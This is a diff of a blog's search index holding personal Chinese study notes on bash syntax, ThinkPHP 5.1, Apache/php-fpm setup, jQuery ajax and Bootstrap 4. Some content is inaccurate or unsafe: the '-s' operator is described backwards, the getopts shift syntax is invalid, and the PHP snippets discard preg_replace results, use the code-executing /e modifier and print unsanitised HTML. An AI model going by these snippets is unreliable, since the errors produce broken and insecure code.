+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1</span><br><span class="line"><span class="keyword">elif</span> condition2 </span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line">    command2</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+<h5 id="case">case</h5>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> 值 <span class="keyword">in</span></span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
+<h4 id="循环结构">循环结构</h4>
+<h5 id="for循环">for循环</h5>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ...;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	command1</span><br><span class="line">	command2</span><br><span class="line">	...</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<h5 id="while循环">while循环</h5>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> condition;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<h5 id="until循环">until循环</h5>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">until condition</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<h4 id="跳出循环">跳出循环</h4>
+<p><strong>continue</strong>：跳出本次循环进行下一次循环</p>
+<p><strong>break</strong>：跳出循环</p>
+<hr />
+<h3 id="基本运算符">基本运算符</h3>
+<h4 id="布尔运算符">布尔运算符</h4>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">运算符</th>
+<th style="text-align: center;">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">！</td>
+<td style="text-align: center;">非运算</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-o</td>
+<td style="text-align: center;">或运算</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-a</td>
+<td style="text-align: center;">与运算</td>
+</tr>
+</tbody>
+</table>
+<h4 id="关系运算符">关系运算符</h4>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">运算符</th>
+<th style="text-align: center;">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">-eq</td>
+<td style="text-align: center;">相等返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-ne</td>
+<td style="text-align: center;">不相等返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-gt</td>
+<td style="text-align: center;">大于返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-lt</td>
+<td style="text-align: center;">小于返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-ge</td>
+<td style="text-align: center;">大于等于返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-le</td>
+<td style="text-align: center;">小于等于返回true</td>
+</tr>
+</tbody>
+</table>
+<h4 id="字符串运算符">字符串运算符</h4>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">运算符</th>
+<th style="text-align: center;">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">=</td>
+<td style="text-align: center;">字符串相等返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">!=</td>
+<td style="text-align: center;">字符串不相等返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-z</td>
+<td style="text-align: center;">字符串长度为0返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-n</td>
+<td style="text-align: center;">字符串长度不为0返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">$</td>
+<td style="text-align: center;">字符串不为空返回true</td>
+</tr>
+</tbody>
+</table>
+<h4 id="文件测试运算符">文件测试运算符</h4>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">运算符</th>
+<th style="text-align: center;">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">-b</td>
+<td style="text-align: center;">是块设备文件返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-c</td>
+<td style="text-align: center;">是字符设备文件返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-d</td>
+<td style="text-align: center;">是文件夹返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-f</td>
+<td style="text-align: center;">是普通文件返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-g</td>
+<td style="text-align: center;">设置了sgid位返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-k</td>
+<td style="text-align: center;">设置了粘滞位返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-p</td>
+<td style="text-align: center;">是有名管道文件返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-u</td>
+<td style="text-align: center;">设置了suid位返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-r</td>
+<td style="text-align: center;">是可读文件返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-w</td>
+<td style="text-align: center;">是可写文件返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-x</td>
+<td style="text-align: center;">是可执行文件返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-s</td>
+<td style="text-align: center;">是空文件返回true</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">-e</td>
+<td style="text-align: center;">文件/文件夹存在返回true</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">-L</td>
+<td style="text-align: center;">文件存在链接返回true</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="函数">函数</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;function&gt; funname()&#123;</span><br><span class="line">	command1</span><br><span class="line">	command2</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="bash检查语法以及查看执行过程">bash检查语法以及查看执行过程</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -n   test.bash   <span class="comment">#查看bash是否存在语法错误</span></span><br><span class="line">bash -x   test.bash   <span class="comment">#查看bash详细的执行过程</span></span><br></pre></td></tr></table></figure>
+<hr />
+<h3 id="信号">信号</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP</span><br><span class="line"> 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1</span><br><span class="line">11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM</span><br><span class="line">16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP</span><br><span class="line">21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ</span><br><span class="line">26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR</span><br><span class="line">31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3</span><br><span class="line">38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8</span><br><span class="line">43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13</span><br><span class="line">48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12</span><br><span class="line">53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7</span><br><span class="line">58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2</span><br><span class="line">63) SIGRTMAX-1  64) SIGRTMAX</span><br></pre></td></tr></table></figure>
+<p><strong>Ctrl+c：sigint</strong>=<strong>kill -2</strong></p>
+<h3 id="trap信号捕捉">trap信号捕捉</h3>
+<p><code>trap</code>是不能捕捉sigkill信号的，kill -9 发送sigkill信号，程序必定停止运行</p>
+<h3 id="read读变量">read读变量</h3>
+<hr />
+<h3 id="脚本使用选项">脚本使用选项</h3>
+<h4 id="getopts">getopts</h4>
+<p>内置变量<strong>$OPTARG</strong>，用于接收选项参数</p>
+<p>选项索引<strong>$OPTIND</strong></p>
+<p>获得最后的参数<code>shift ${$OPTIND-1}</code></p>
 ]]></content>
       <categories>
-        <category>运维</category>
+        <category>编程</category>
       </categories>
   </entry>
   <entry>
@@ -618,30 +882,61 @@
       </categories>
   </entry>
   <entry>
-    <title>ansible-笔记</title>
-    <url>/ansible-%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="ansible">ansible</h2>
-<h3 id="概念">概念</h3>
+    <title>2018-寒假学习记录</title>
+    <url>/2018-%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="寒假学习记录">2018-寒假学习记录</h1>
+<h3 id="假期学习了">假期学习了</h3>
+<ul>
+<li>Thinkphp5.1</li>
+<li>Bootstrap4</li>
+<li>jquery ajax</li>
+<li>markdown</li>
+</ul>
+<h2 id="section"><a id="more"></a></h2>
+<h4 id="便于爬虫识别的html标签">便于爬虫识别的html标签</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">section定义 </span><br><span class="line">	用来区分各板块</span><br><span class="line">header main footer为方便爬虫检索</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table定义</span><br><span class="line"></span><br><span class="line">&lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;Month&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th&gt;Savings&lt;&#x2F;th&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;January&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;$100&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">div 背景图片自适应显示</span><br><span class="line">	background-image: url(..&#x2F;imgs&#x2F;footerkuang.png);</span><br><span class="line">    background-repeat: no-repeat;     &#x2F;&#x2F;无重复</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    -moz-background-size: 100% 100%;</span><br><span class="line">	</span><br><span class="line">图片自适应div大小 </span><br><span class="line">	可重复</span><br><span class="line">	background-size:contain</span><br></pre></td></tr></table></figure>
+<h4 id="thinkphp5.1">ThinkPhp5.1</h4>
 <ol type="1">
-<li>自动化运维服务端</li>
-<li>不需要安装客户端</li>
-<li><img src="/uploads/ansible流程.jpeg" title="fig:" alt="图片" /></li>
-<li>yum install epel-relese -y</li>
-<li>yum install ansible -y</li>
-<li>首先,要先配置ssh免密登录</li>
-<li>ssh-keygen</li>
-<li>一路回车</li>
-<li><code>ssh-copy-id [-i [identity_file]] [user@]machine</code> <a id="more"></a> ### epel 源 扩展源 基本源 在/mnt下</li>
+<li>在linux下,需要权限php程序才能运行php文件,所以需要<code>chown apache2.apache2 /var/html/tp5/runtime -R</code> 递归修改tp5下的runtime目录</li>
+<li>在linux下,使用文件上传,应该给tp5目录下的public/upload目录apapche用户权限,否则无法上传文件.</li>
+<li>在linux下,需要额外安装php7.2-mysql,否则会产生无法访问数据库的错误.</li>
+<li>linux配置php-fpm时,使用sock连接fpm时应该这么写</li>
 </ol>
-<p>先配置免密登录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        DocumentRoot &quot;&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&quot;                        </span><br><span class="line">        ServerName www.divint3.com            </span><br><span class="line">        ServerAlias divint3.com               </span><br><span class="line">        DirectoryIndex index.htm index.php index.html</span><br><span class="line">  &lt;Directory &quot;&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&quot;&gt;</span><br><span class="line">        Options FollowSymLinks ExecCGI &#x2F;&#x2F;禁止访问目录,允许在该目录下执行CGI脚本</span><br><span class="line">        AllowOverride All &#x2F;&#x2F;允许rewrite,根据htc</span><br><span class="line">        Order allow,deny &#x2F;&#x2F;设置缺省的访问权限与Allow和Deny语句的处理顺序</span><br><span class="line">        Allow from all &#x2F;&#x2F;允许从任何地址访问</span><br><span class="line">        Require all granted &#x2F;&#x2F;允许所有请求访问资源</span><br><span class="line">        Satisfy all &#x2F;&#x2F;禁止直接访问</span><br><span class="line">  &lt;&#x2F;Directory&gt;</span><br><span class="line">        ProxyRequests Off</span><br><span class="line">        ProxyPassMatch ^&#x2F;(.*\.php(&#x2F;.*)?)$ unix:&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock|fcgi:&#x2F;&#x2F;localhost&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&#x2F;</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+<p>最后用phpinfo()验证是否开启php-fpm成功</p>
+<ol start="5" type="1">
+<li>linux下apache开启模块 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a2enmod rewrite </span><br><span class="line">a2enmod proxy</span><br><span class="line">a2enmod proxy_fcgi</span><br></pre></td></tr></table></figure></li>
+<li>想要隐藏url的php文件名,应该编辑.<strong>htaccess</strong> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  &#x2F;&#x2F;以上为默认配置文件</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s&#x3D;$1 [QSA,PT,L]</span><br><span class="line">  &#x2F;&#x2F;写的是rewrite规则,可以省略index.php文件访问</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure></li>
+<li>本来要自己写分页操作的,没想到tp5自己有分页操作,语法 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bkList</span><span class="params">($type)</span></span>&#123;</span><br><span class="line">    $info=Bkarticle::where(<span class="string">"type"</span>,$type)-&gt;paginate(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// 获取分页显示</span></span><br><span class="line">    $page = $info-&gt;render();</span><br><span class="line">    <span class="comment">// 模板变量赋值</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">'info'</span>, $info);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">'page'</span>, $page);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> Bkartical为数据库中的同名表.可用于查询数据库中的同名表.<code>paginate(10)</code>的意思是每页显示十条数据. 这是tp5中的模型操作数据库. <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;extend name="./common/father" /&#125; //继承父模板</span><br><span class="line"></span><br><span class="line">&#123;block name="title"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>灾害大百科<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name="content"&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"text-center table  table-bordered"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章标题<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章内容预览<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;volist name='info' id='bklist' length="50"&#125;</span><br><span class="line">            &#123;php&#125;</span><br><span class="line">                $content=$bklist["content"];</span><br><span class="line">                preg_replace('/<span class="tag">&lt;<span class="name">\s*img\s+[^</span>&gt;</span>]*?src\s*=\s*(\'|\")(.*?)\\1[^&gt;]*?\/?\s*&gt;/i','[图片]',$content); //把数据库中取出的html文本数据中的匹配img标签的文本替换为[img],因为这这只是一个预览内容,不能把整个img文件链接地址暴露出来</span><br><span class="line">                preg_replace('/(<span class="tag">&lt;/<span class="name">?)(w+)([^</span>&gt;</span>]*&gt;)/e', "'\1'.strtoupper('\2').'\3'", $content); //替换掉所有标签,只保留文本内容</span><br><span class="line">                $content=substr($content,0,100); //截取100的长度</span><br><span class="line">            &#123;/php&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/bkarticle/&#123;$bklist.id&#125;"</span>&gt;</span>&#123;$bklist.title&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"text-left"</span>&gt;</span>&#123;php&#125;echo $content;&#123;/php&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;/volist&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"float-right"</span>&gt;</span>&#123;$info|raw&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> //这里输出分页表</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name="js"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/js/baike/bklist.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br></pre></td></tr></table></figure> 使用jquery为对象添加class,因为{$info|raw}输出的是一个html代码,而这个代码不法修改,只能用jquery确定元素,增加class <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(function () &#123;</span><br><span class="line">    $(&quot;main section div div ul li&quot;).addClass(&quot;page-item&quot;);</span><br><span class="line">    $(&quot;main section div div ul span&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">    $(&quot;main section div div ul li a&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure> 分页效果如下 <img src="/uploads/fzcms.png" alt="分页" /></li>
+<li>phpstrom在linux下有个东西不知道怎么取消,反正就是根据是否使用git提交文件的颜色会有变化,其实只要Alt+F12 用git同步就行了,一个add,一个comment颜色就没啦,这种颜色不一样保持了我这个强迫症不断备份啊.红色是未提交,绿色是新添加,蓝色是已修改</li>
+</ol>
+<p>9.PHP版本过高会使tp5无法连接数据库,在尝试数据库迁移时,会报错<code>SQLSTATE[HY000] [2054] The server requested authentication method unknown to the client</code>发生这种错误，是由于MySQL 8默认使用了新的密码验证插件：caching_sha2_password，而之前的PHP版本中所带的mysqlnd无法支持这种验证。</p>
+<p>修改 /etc/mysql/my.cnf，添加下面一行： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">default_authentication_plugin&#x3D; mysql_native_password</span><br></pre></td></tr></table></figure> 然后重置密码： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER USER &#39;user&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;password&#39;;</span><br></pre></td></tr></table></figure> ---</p>
+<h4 id="简单的ajax.post">简单的ajax.post</h4>
 <ol type="1">
-<li>定义主机清单</li>
-<li><code>ansible -i 配置文件 组名 -m 模块名</code></li>
-<li><code>ansible -i 配置文件 组名 -m 模块名  -a "name=httpd state=latest"</code></li>
+<li>首先说说a标签如何触发onclick事件</li>
 </ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:void(0);"</span> <span class="attr">onclick</span>=<span class="string">"js_method()"</span>&gt;</span>Some Thing<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里herf超链接指向了一个空的js脚本,然后定义onclick事件 这样,我们可以使用a标签使用onclick事件发送一个ajax请求 定义一个类 叫做upload,创建一个方法,用来接收数据,这里在js处理完数据后,php仍然会检验数据可用性,我把它定义在了<strong>admin/bkadd/addcheck</strong>下, <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 前端文章上传类</span></span><br><span class="line"><span class="comment">* @author Divint3</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> upload = &#123;</span><br><span class="line">    check: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> type = $(<span class="string">'input[name="type"]:checked'</span>).val();</span><br><span class="line">        <span class="keyword">var</span> title = $(<span class="string">'input[name="title"]'</span>).val();</span><br><span class="line">        <span class="keyword">var</span> content = editor.txt.html();<span class="comment">//获取各种值并定义变量</span></span><br><span class="line">        <span class="keyword">if</span> (content == <span class="string">"&lt;p&gt;&lt;br&gt;&lt;/p&gt;"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"内容不能为空"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!title) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"标题不能为空"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!type) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"未指定文章类型"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">"admin/bkadd/addcheck"</span>;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;</span><br><span class="line">            <span class="string">"type"</span>: type,</span><br><span class="line">            <span class="string">"title"</span>: title,</span><br><span class="line">            <span class="string">"content"</span>: content,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        $.post(url, data, <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;<span class="comment">//result是admin/bkadd/addcheck返回的json数据</span></span><br><span class="line">            <span class="keyword">if</span> (result.status) &#123;<span class="comment">//status返回的是php检验数据是否成功,检验数据成功后,tp5助手函数db会返回一个非零数值,如果插入失败,返回零</span></span><br><span class="line">                dialog.success(result.message);<span class="comment">//dialog封装了layer弹出层的方法,方便调用</span></span><br><span class="line">                editor.txt.html(<span class="string">'&lt;p&gt;&lt;br&gt;&lt;/p&gt;'</span>);</span><br><span class="line">                $(<span class="string">'input[name="title"]'</span>).val(<span class="string">""</span>);<span class="comment">//数据信息清空</span></span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                dialog.error(result.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"JSON"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>PHP检验代码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//这里接收ajax请求,处理请求</span></span><br><span class="line">        $type = $_POST[<span class="string">'type'</span>];</span><br><span class="line">        $title = $_POST[<span class="string">'title'</span>];</span><br><span class="line">        $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!$type) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'未指定文章类型'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$title) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'标题不能为空'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($content == <span class="string">"&lt;p&gt;&lt;br&gt;&lt;/p&gt;"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'内容不能为空'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [</span><br><span class="line">            <span class="string">"type"</span> =&gt; $type,</span><br><span class="line">            <span class="string">"title"</span> =&gt; $title,</span><br><span class="line">            <span class="string">"content"</span> =&gt; $content,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $isset = Bkarticle::where(<span class="string">"title"</span>, $title)-&gt;find();</span><br><span class="line">        <span class="keyword">if</span> ($isset == <span class="keyword">array</span>()) &#123;</span><br><span class="line">            $s = db(<span class="string">"bkarticle"</span>)-&gt;data($data)-&gt;insert();</span><br><span class="line">            <span class="keyword">return</span> show($s, <span class="string">"插入百科文章成功"</span>, <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"type"</span> =&gt; $type,</span><br><span class="line">                <span class="string">"content"</span> =&gt; $content,</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">"这个文章名已经被用过了"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里的show方法我定义在了application下的comment.php下,因为这里是公共方法,所有方法都可以引用 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($status, $message, $data = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result=[</span><br><span class="line">        <span class="string">'status'</span>=&gt;$status,</span><br><span class="line">        <span class="string">'message'</span>=&gt;$message,</span><br><span class="line">        <span class="string">'data'</span>=&gt;$data,</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">exit</span>(json_encode($result));</span><br><span class="line">&#125;<span class="comment">//就是返回了一个json,给使用ajax.post方法的一个result,这样js才能处理插入状态</span></span><br></pre></td></tr></table></figure></p>
+<hr />
+<h4 id="bootstrap4">bootstrap4</h4>
+<ol type="1">
+<li>使用bs4的原因是他的排版和配色真的好看,给大家一个bs4主题链接https://bootswatch.com/ ,配色什么的方案多样.</li>
+<li>bs4的栅格结构也很好,支持动态响应.反正我现阶段是写不出来.</li>
+<li>bs4没啥好说的,就是个css加js,调用就完事了. 常用知识点 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">容器</span><br><span class="line">	container 类用于固定宽度并支持响应式布局的容器。</span><br><span class="line">	container-fluid 类用于 100% 宽度，占据全部视口（viewport）的容器</span><br><span class="line">颜色操作 bg-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">	</span><br><span class="line">前景色 text-</span><br><span class="line"></span><br><span class="line">字体位置</span><br><span class="line">	text-center&#x2F;left&#x2F;right</span><br><span class="line">	font-weight-normal 普通</span><br><span class="line">				-bold 加粗</span><br><span class="line">英文变换</span><br><span class="line">	text-lowercase 小写</span><br><span class="line">		-uppercase 大写</span><br><span class="line">		-capitalize 自动大小写</span><br><span class="line">字体大小 display-</span><br><span class="line">	display-1 最大</span><br><span class="line">			-2</span><br><span class="line">			-3</span><br><span class="line">			-4 最小</span><br><span class="line"></span><br><span class="line">网格系统 col-</span><br><span class="line">	一共划分为12个网格</span><br><span class="line">	.col- 针对极小屏幕</span><br><span class="line">	.col-sm- 平板 - 屏幕宽度等于或大于 576px</span><br><span class="line">	.col-md- 桌面显示器 - 屏幕宽度等于或大于 768px)</span><br><span class="line">	.col-lg- 大桌面显示器 - 屏幕宽度等于或大于 992px)</span><br><span class="line">	.col-xl- 超大桌面显示器 - 屏幕宽度等于或大于 1200px)</span><br><span class="line">	